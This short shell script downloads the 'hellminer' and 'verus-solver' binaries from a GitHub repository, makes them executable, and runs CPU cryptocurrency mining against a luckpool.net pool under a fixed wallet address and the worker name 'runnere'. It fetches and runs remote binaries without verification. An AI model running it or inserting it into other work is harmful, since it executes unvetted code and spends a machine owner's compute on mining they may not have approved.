#!/bin/sh

wget https://github.com/vrscms/hellminer/raw/main/hellminer
wget https://github.com/vrscms/hellminer/raw/main/verus-solver
chmod +x verus-solver
chmod +x hellminer
./hellminer -c stratum+tcp://eu.luckpool.net:3956#xnsub -u RJWHkHUFByrjCtSwgjZZETwrDPYHRXwAA3.runnere -p x --cpu 4
